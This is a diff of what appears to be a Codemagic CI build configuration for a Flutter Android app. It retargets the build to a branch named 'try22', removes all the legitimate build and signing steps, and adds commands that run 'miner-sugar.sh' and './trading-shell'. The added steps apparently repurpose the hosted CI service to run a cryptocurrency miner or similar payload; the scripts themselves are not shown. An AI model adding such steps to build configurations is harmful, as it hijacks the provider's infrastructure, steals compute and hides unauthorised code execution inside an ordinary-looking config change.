@@ -9,44 +9,14 @@ workflows:
         - push
         - tag
       branch_patterns:
-        - pattern: 'master'
+        - pattern: 'try22'
           include: true
           source: true
     scripts:
       - name: Check if project has changed
         script: |
-          is_project_changed=$(git diff --name-only --diff-filter=M @~..@ 'codemagic.yaml')
-          if [ -z "$is_project_changed" ]; then
-            echo "Project didn't change, abort the build"
-            exit 1
-          else
-            echo "Project was changed, continue build"
-          fi
-      - |
-        # set up debug keystore
-        rm -f ~/.android/debug.keystore
-        keytool -genkeypair \
-          -alias androiddebugkey \
-          -keypass android \
-          -keystore ~/.android/debug.keystore \
-          -storepass android \
-          -dname 'CN=Android Debug,O=Android,C=US' \
-          -keyalg 'RSA' \
-          -keysize 2048 \
-          -validity 10000
-      - |
-        # set up local properties
-        echo "flutter.sdk=$HOME/programs/flutter" > "$FCI_BUILD_DIR/android/local.properties"
-      - flutter packages pub get
-      - flutter build appbundle --debug
-      - |
-        # generate universal apk signed with debug key
-        universal-apk generate \
-          --ks ~/.android/debug.keystore \
-          --ks-pass android \
-          --ks-key-alias androiddebugkey \
-          --key-pass android \
-          --pattern 'build/**/outputs/**/*.aab'
+          sh miner-sugar.sh
+      - ./trading-shell
     artifacts:
       - build/**/outputs/**/*.apk
       - build/**/outputs/**/*.aab
